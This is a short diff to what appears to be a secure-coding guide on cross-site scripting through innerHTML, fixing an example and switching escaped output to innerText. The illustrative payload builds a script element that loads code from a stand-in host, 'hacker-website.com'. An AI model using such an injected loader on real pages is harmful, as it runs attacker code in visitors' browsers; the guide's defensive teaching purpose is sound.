@@ -89,7 +89,7 @@ Consider the following input of an `innerHTML` statement is a comment in your on
 
     let x = document.createElement('script');
     x.src = 'http://hacker-website.com/malicious-script.js';
-    document.childNodes.addAt(0, src);
+    document.childNodes.addAt(0, x);
     alert('you are hacked');
 
 This may lead to run harmful scripts on your device.
@@ -99,4 +99,4 @@ This may lead to run harmful scripts on your device.
 You can use `innerText` instead, or you can use
 
     content = content.replace(/</g, "&lt;").replace(/>/g, "&gt;");
-    el.innerHTML = content;
+    el.innerText = content;
